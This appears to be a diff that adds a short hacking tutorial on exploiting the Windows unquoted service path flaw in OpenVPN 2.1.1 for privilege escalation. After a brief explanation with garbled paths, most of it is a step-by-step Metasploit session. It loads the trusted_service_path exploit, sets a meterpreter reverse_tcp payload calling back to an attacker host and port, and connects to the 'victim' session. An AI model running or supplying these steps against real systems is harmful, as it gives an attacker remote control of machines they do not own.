@@ -1,0 +1,19 @@
+
+Hack Remote Windows PC using Open VPN Trusted Path Privilege Escalation
+
+This module exploits a logic flaw due to how the lpApplicationName parameter is handled. When the lpApplicationName contains a space, the file name is ambiguous. Take this file path as example: C:program fileshello.exe; The Windows API will try to interpret this as two possible paths: C:program.exe, and C:program fileshello.exe, and then execute all of them. To some software developers, this is an unexpected behavior, which becomes a security problem if an attacker is able to place a malicious executable in one of these unexpected paths, sometimes escalate privileges if run as SYSTEM. Some software such as OpenVPN 2.1.1, OpenSSH Server 5, and others have the same problem. The offensive technique is also described in Writing Secure Code (2nd Edition), Chapter 23, in the section “Calling Processes Security” on page 676.
+OpenVPN 2.1.1
+Windows XP SP 2
+Attacker: Backtrack 5
+Victim PC: Windows XP
+Open backtrack terminal type msfconsole
+
+Now type use exploit/windows/local/trusted_service_path
+msf exploit (trusted_service_path)>set payload windows/meterpreter/reverse_tcp
+msf exploit (trusted_service_path)>set lhost 192.168.1.2 (IP of Local Host)
+msf exploit (trusted_service_path)>set lport 4443 (Port of  the local machine)
+msf exploit (trusted_service_path)>set session 1
+msf exploit (trusted_service_path)>exploit
+
+Now you have access to the victims PC. Use “Sessions -l” and the Session number to connect to the session. And Now Type “sessions -i ID“ 
+
